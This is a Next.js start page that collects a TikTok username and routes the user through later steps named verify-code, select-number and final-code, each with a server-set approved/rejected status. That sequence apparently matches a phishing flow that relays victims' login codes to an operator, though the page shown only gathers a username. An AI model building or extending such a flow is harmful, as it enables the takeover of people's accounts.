
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { UserPlus, ArrowRight, Loader2 } from 'lucide-react';
import { useRouter } from 'next/navigation';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { useToast } from '@/hooks/use-toast';
import { useEffect, useState } from 'react';
import { Loader } from '@/components/loader';
import type { AuthUser } from '@/lib/types';


const formSchema = z.object({
  tiktokUsername: z.string().min(2, 'Username must be at least 2 characters.'),
});

type FormValues = z.infer<typeof formSchema>;

export default function StartPage() {
  const router = useRouter();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(true);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      tiktokUsername: '',
    },
  });
  
  useEffect(() => {
    // If the user is already logged in from sessionStorage, route them to the correct step
    const storedUser = sessionStorage.getItem('user-session');
    if (storedUser) {
        const parsedUser: AuthUser = JSON.parse(storedUser);
        const submission = parsedUser.submission;

        if (submission.finalCodeStatus === 'approved') {
            router.replace('/success');
        } else if (submission.phoneNumberStatus === 'approved' || (submission.finalCode && submission.finalCodeStatus !== 'rejected')) {
            router.replace('/start/final-code');
        } else if (submission.verificationCodeStatus === 'approved' || (submission.phoneNumber && submission.phoneNumberStatus !== 'rejected')) {
            router.replace('/start/select-number');
        } else if (submission.tiktokUsernameStatus === 'approved') {
            router.replace('/start/verify-code');
        } else {
             setIsLoading(false);
        }
    } else {
        setIsLoading(false);
    }
  }, [router]);

  const onSubmit = async (values: FormValues) => {
    try {
        const id = values.tiktokUsername.startsWith('@') ? values.tiktokUsername.substring(1) : values.tiktokUsername;
        
        const res = await fetch('/api/submissions', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id, step: 'tiktokUsername' })
        });
        
        const submissionData = await res.json();

        if (!res.ok) {
             throw new Error(submissionData.message || 'Could not log in.');
        }

        const newUser: AuthUser = { id, submission: submissionData };
        sessionStorage.setItem('user-session', JSON.stringify(newUser));
        
        router.push('/start/verify-code');

    } catch (error) {
      toast({
        variant: 'destructive',
        title: 'An Error Occurred',
        description: error instanceof Error ? error.message : 'An unexpected error occurred.',
      });
    }
  };

  const { isSubmitting } = form.formState;

  if (isLoading) {
     return (
         <div className="w-full max-w-lg text-center">
            <Loader isFadingOut={false} />
            <h1 className="text-xl font-semibold mt-4">Checking your status...</h1>
            <p className="text-muted-foreground">Please wait a moment.</p>
         </div>
    )
  }

  // If not loading and not logged in, show the form
  return (
    <div className="w-full max-w-sm">
        <div className="text-center mb-8">
            <UserPlus className="mx-auto h-10 w-10 text-primary" />
            <h1 className="text-2xl mt-4 font-bold">Welcome!</h1>
            <p className="text-muted-foreground">
                Enter your TikTok username to get started.
            </p>
        </div>
        <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                <div className="grid gap-4">
                    <FormField
                        control={form.control}
                        name="tiktokUsername"
                        render={({ field }) => (
                            <FormItem>
                            <FormLabel>TikTok Username</FormLabel>
                            <FormControl>
                                <Input placeholder="@username" {...field} />
                            </FormControl>
                            <FormMessage />
                            </FormItem>
                        )}
                    />
                </div>
                <div className="flex flex-col gap-4">
                    <Button type="submit" disabled={isSubmitting} className="w-full">
                    {isSubmitting ? <Loader2 className="animate-spin" /> : 'Continue'}
                    <ArrowRight className="ml-2 h-4 w-4" />
                    </Button>
                </div>
            </form>
        </Form>
    </div>
  );
}
